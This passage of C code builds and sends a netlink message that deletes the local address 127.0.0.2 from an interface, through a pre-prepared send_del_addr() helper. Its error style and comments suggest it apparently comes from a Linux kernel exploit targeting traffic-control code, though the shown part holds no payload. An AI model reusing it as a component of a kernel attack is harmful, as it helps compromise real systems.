    nlh->nlmsg_flags = NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    ifm = NLMSG_DATA(nlh);
    ifm->ifa_family = AF_INET;
    ifm->ifa_prefixlen = 32;
    ifm->ifa_flags = 0;
    ifm->ifa_scope = RT_SCOPE_UNIVERSE;
    ifm->ifa_index = link_id;

    tca = (void *)ifm + NLMSG_ALIGN(sizeof(struct ifaddrmsg));
    tca = set_u32_attr(tca, IFA_LOCAL, 0x200007f); // 127.0.0.2
    tca = set_u32_attr(tca, IFA_ADDRESS, 0x200007f); // 127.0.0.2

    /* IOV preparation */
    memset(&g_addr_del_iov, 0, sizeof(struct iovec));
    g_addr_del_iov.iov_base = (void *)nlh;
    g_addr_del_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_addr_del_msg, 0, sizeof(g_addr_del_msg));
    g_addr_del_msg.msg_name = (void *)&g_addr_del_dest_snl;
    g_addr_del_msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    g_addr_del_msg.msg_iov = &g_addr_del_iov;
    g_addr_del_msg.msg_iovlen = 1;
}

void send_del_addr(void)
{
    int ret;

    ret = sendmsg(g_tc_fd, &g_addr_del_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to del addr");
}